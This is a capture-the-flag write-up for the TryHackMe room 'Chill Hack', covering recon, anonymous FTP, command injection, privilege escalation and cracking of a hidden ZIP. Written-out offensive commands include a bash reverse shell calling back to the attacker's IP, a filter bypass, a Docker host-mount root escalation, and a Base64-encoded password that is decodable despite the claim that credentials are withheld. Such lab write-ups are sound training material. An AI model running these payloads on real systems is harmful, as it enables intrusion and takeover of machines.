# 🔥 Chill Hack — TryHackMe


|                 |                   |
| --------------- | ----------------- |
| **Platform**    | TryHackMe         |
| **Room**        | Chill Hack        |
| **Difficulty**  | Easy              |
| **Target IP**   | `10.128.184.149`  |
| **Attacker IP** | `192.168.129.228` |


---

## 1. 🔎 Reconnaissance

I started by performing an Nmap scan to identify open ports, running services, and their versions.

```bash
nmap -sC -sV 10.128.184.149
```

**Open Ports:**


| Port   | Service | Version       |
| ------ | ------- | ------------- |
| 21/tcp | FTP     | vsftpd 3.0.5  |
| 22/tcp | SSH     | OpenSSH 8.2p1 |
| 80/tcp | HTTP    | Apache 2.4.41 |


👉 **Key finding:** anonymous FTP access is enabled.

---

## 2. 📁 FTP Enumeration

I connected to the FTP service using the anonymous account.

```bash
ftp 10.128.184.149
# Name: anonymous
# Password: (empty)
```

Anonymous authentication was successful. I found a file named `note.txt` on the FTP server and downloaded it:

```bash
get note.txt
```

**Contents of `note.txt`:**

> Anurodh told me that there is some filtering on strings being put in the command -- Apaar

💡 **Important clue:** a string-filtering mechanism exists within the web application.

---

## 3. 🌐 Web Enumeration

I then investigated the HTTP service running on port 80.

The web application exposed an **endpoint accepting user input** that allowed commands to be executed.

The application was vulnerable to **command injection**, but it filtered certain strings used in commands.

**Bypass:** the filtering could be bypassed by using the **absolute path** to the required binary:

```bash
/bin/bash
```

This technique made it possible to bypass the filtering mechanism and execute a reverse shell.

---

## 4. 💻 Command Injection

I configured a Netcat listener on my attacking machine:

```bash
nc -lvnp <PORT>
```

I then supplied a Bash reverse-shell payload through the vulnerable parameter:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.228/<PORT> 0>&1'
```

After executing the payload, I received a connection back to my machine: **initial shell obtained** on the target. 🎉

At this point, I started enumerating the system to identify potential privilege-escalation paths.

---

## 5. ⬆️ Privilege Escalation to Apaar

During local enumeration, I discovered an interesting script: `.helpfine.sh`.

I checked the current user's sudo privileges:

```bash
sudo -l
```

The script could be executed with elevated privileges as the user **apaar**. I ran it in that context and obtained a shell with apaar's privileges.

### 🚩 User Flag

```text
e8vpd3****************************
```

---

## 6. 🔍 Local Enumeration

After obtaining access as apaar, I continued enumerating the user's home directory and hidden files:

```bash
ls -la /home/apaar/
```

A `.ssh` directory was present — SSH-related files could potentially be useful for further access.

I also continued investigating the files belonging to the web application.

---

## 7. 🔐 Credential Discovery

While examining the web application's files, I found:

```text
/var/www/files/index.php
```

The PHP source code contained credentials stored in **clear text**.

💡 Credentials stored in application source code can potentially be **reused to access other services**.

I also discovered an image directory containing files that appeared relevant to the challenge.

---

## 8. 🖼️ Steganography

One of the images contained hidden data: a **ZIP archive** was embedded within it.

The archive was **password protected**. I extracted its hash and cracked it with John the Ripper:

```bash
# Extract the hash
zip2john archive.zip > hash.txt

# Crack the password
john hash.txt --wordlist=<wordlist>
```

The recovered password allowed me to extract the archive:

```bash
unzip archive.zip
```

Inside, I found a PHP file containing an encoded credential, encoded in **Base64**:

```text
IWQwbnRLbjB3bVlwQHNzdzByZA==
```

I decoded it with:

```bash
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
```

This revealed a password associated with the **anurodh** account.

> ⚠️ **Note:** sensitive credentials are intentionally not displayed in clear text in this write-up.

---

## 9. 🔑 SSH Access

I tested the recovered credentials against the SSH service:

```bash
ssh anurodh@10.128.184.149
```

The credentials were valid, giving me an **interactive SSH session as anurodh**, allowing further local enumeration from this account.

---

## 10. 🐳 Docker Privilege Escalation

While enumerating the anurodh account, I discovered that the user had access to **Docker**.

💡 Docker access can be highly privileged: containers can potentially be started with access to the **host filesystem**.

I used the following Docker-based privilege-escalation technique:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

**How it works:**

- `-v /:/mnt` → mounts the host filesystem inside the container under `/mnt`;
- `chroot /mnt /bin/sh` → changes the root directory to the mounted host filesystem.

I obtained a root shell and verified my privileges:

```bash
whoami
```

**Output:**

```text
root
```

✅ Escalation to **root** confirmed.

---

## 11. 🚩 Root Flag

With root access, I was able to retrieve the final flag:

```text
w18gfp****************************
```

---

## 📝 Attack Path Summary

1. **Recon** → Nmap: FTP (anonymous), SSH, HTTP
2. **FTP** → `note.txt`: clue about command filtering
3. **Web** → Command injection, bypassed via absolute path `/bin/bash`
4. **Initial shell** → Netcat reverse shell
5. **Escalation** → `.helpfine.sh` script via `sudo -l` → user **apaar** → 🚩 User flag
6. **Credentials** → Clear-text passwords in `index.php`
7. **Stego** → ZIP hidden in an image, cracked with John → **anurodh** password (Base64)
8. **SSH** → Logged in as anurodh
9. **Root** → Docker escape (`docker run -v /:/mnt`) → 🚩 Root flag
